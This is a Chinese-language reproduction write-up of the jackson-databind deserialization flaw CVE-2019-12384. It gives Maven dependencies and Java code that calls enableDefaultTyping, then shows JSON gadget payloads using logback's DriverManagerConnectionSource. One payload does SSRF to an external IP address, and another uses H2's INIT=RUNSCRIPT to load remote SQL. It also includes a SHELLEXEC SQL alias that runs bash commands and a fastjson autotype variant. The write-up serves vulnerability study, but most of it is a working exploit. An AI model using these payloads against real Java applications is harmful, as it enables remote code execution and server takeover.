## cve-2019-12384 

### 1. 漏洞描述
6月21日，Redhat官方发布jackson-databind漏洞（CVE-2019-12384）安全通告，多个Redhat产品受此漏洞影响，CVSS评分为8.1，漏洞利用复杂度高。7月22日，安全研究员Andrea Brancaleoni对此漏洞进行分析，并公布了该漏洞的分析文章。

该漏洞是由于Jackson黑名单过滤不完整而导致，当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的json数据包对应用进行攻击，直接获取服务器控制权限。 

https://blog.doyensec.com/2019/07/22/jackson-gadgets.html  

参考：https://www.freebuf.com/vuls/209394.html 
### 2. 漏洞复现
#### 1. 安装依赖包  
本次漏洞依赖的第三方jar包有点多，除了jackson自身的jar包外还需要logback-core和h2，采用如下pom配置：  

	<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.8</version>
	</dependency>

	<!--https://mvnrepository.com/artifact/ch.qos.logback/logback-core -->
	<dependency>
   		<groupId>ch.qos.logback</groupId>
   		<artifactId>logback-classic</artifactId>
   		<version>1.2.3</version>
		</dependency>
		<dependency>
    		<groupId>ch.qos.logback</groupId>
    		<artifactId>logback-core</artifactId>
    		<version>1.2.3</version>
		</dependency>

	<!--https://mvnrepository.com/artifact/com.h2database/h2 -->
	<dependency>
    	<groupId>com.h2database</groupId>
    	<artifactId>h2</artifactId>
    	<version>1.4.199</version>
    	<scope>test</scope>
	</dependency>
	<dependency>
    	<groupId>com.h2database</groupId>
    	<artifactId>h2</artifactId>
    	<version>1.4.199</version>
    	<scope>compile</scope>
	</dependency> 
	
说明：在本次搭建环境时，依赖spring-boot环境，pom引入1.3.0-alpha4版本时，存在Class不存在的问题，故使用其余的版本，但是在验证时spring-boot好像默认引入了logback，在去除明确的依赖后，依旧能触发漏洞。 

#### 2. Jackson漏洞示例代码
漏洞环境参见Vulenvironment工程JacksonSerial.java

	package com.snowsec0.jackson;

	import com.fasterxml.jackson.databind.ObjectMapper;

	import com.fasterxml.jackson.databind.SerializationFeature;

	import org.h2.Driver;


	public class JacksonSerial {
	
	/*
	 * cve-2019-12384
	 */

	public static void cve201912384() {
		try {
		//一定要实例化Driver否则会报错
        Class.forName("org.h2.Driver").newInstance();

        System.out.println("Mapping");

        //该条payload用于SSRF的复现

        String jsonStr1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://47.104.218.243/ssrf/ssrf.php\"}]";

        //该条payload用于RCE的复现

        String jsonStr2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1/inject.sql'\"}]";

        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);

        System.out.println("Serializing");

        Object obj = mapper.readValue(jsonStr2, java.lang.Object.class);

        System.out.println("objectified");
        
        System.out.println("stringified: " + mapper.writeValueAsString(obj));
		}catch(Exception e)
		{
			System.out.println(e.toString());
		}
		
		
	}
	}

通过H2的SQL语句执行命令，搭建服务器，编写命令执行的SQL，远程加载恶意的SQL文件：  

	CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException{

    String[] command = {"bash", "-c", cmd};

    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");

    return s.hasNext() ? s.next() : "";  }

	$$;

	CALL SHELLEXEC('open /Applications/Calculator.app/')
	
#### 3. Jackson漏洞执行结果

![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/Jackson/CVE-2019-12384/exec_calc.png)


### 3. 该漏洞也影响fastjson，验证需要开启autotype

	//Jackson漏洞影响fastjosn
	@RequestMapping("jackfastjson")
	public String jackfastjson()
	{
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1/inject.sql'\"}";
        JSONObject json = JSON.parseObject(payload);
        json.toJSONString();
		return "jack fastjson";
	}
	
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/Jackson/CVE-2019-12384/exec_fastjson_calc.png)
